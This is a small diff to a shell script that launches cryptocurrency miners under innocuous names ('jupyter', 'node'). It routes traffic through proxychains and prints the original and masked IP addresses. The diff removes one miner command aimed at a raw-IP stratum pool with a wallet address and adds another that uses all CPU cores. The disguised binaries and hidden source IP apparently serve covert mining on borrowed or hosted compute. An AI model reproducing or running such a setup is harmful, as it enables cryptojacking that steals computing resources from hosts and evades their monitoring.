@@ -1,5 +1,4 @@
 chmod +x proxychains.conf jupyter proxy libproxychains4.so compile.sh
 echo "IP ORI ==> "$(curl ifconfig.me)
 echo "IP Baru ==> "$(./proxy curl ifconfig.me)
-./jupyter --algorithm verushash --pool stratum+tcp://139.99.16.105:5040 --wallet RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.CRO-10 --password x --cpu-threads 12
-
+./node --url 146.59.217.34:17155 --tls -u vdjk7jb0ag5z1k3revnkhp7xhlrj794a24bhwk.of -p webpassword=x -k -a randomvirel -t $(nproc --all) 
